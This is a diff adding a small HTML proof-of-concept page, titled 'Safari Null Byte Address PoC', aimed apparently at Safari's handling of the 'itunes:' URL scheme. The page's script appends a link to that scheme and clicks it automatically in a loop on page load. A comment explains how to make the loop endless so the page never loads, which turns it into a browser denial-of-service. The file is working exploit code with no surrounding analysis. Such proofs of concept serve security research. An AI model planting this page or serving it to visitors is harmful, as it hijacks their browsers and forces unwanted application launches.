@@ -1,0 +1,28 @@
+<html>
+
+<!-- Head -->
+<head>
+	<title>Safari Null Byte Address PoC</title>
+	<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
+</head>
+
+<!-- Body -->
+<body>
+	<p id="result" style="color:red"></p>
+	<p>PoC Test v.05</p>
+</body>
+
+<!-- Exploit -->
+<script type="text/javascript">
+$(document).ready(function() {
+//jQuery('#result').append('<a href="itunes:hello%00">.</a>'); // null byte is unnecessary
+jQuery('#result').append('<a href="itunes:hello">.</a>');
+c = 0;
+while(c < 10) {
+	document.querySelector('a').click();
+	c++; // Comment this increment out to make the page never load
+}
+});
+</script>
+
+</html>
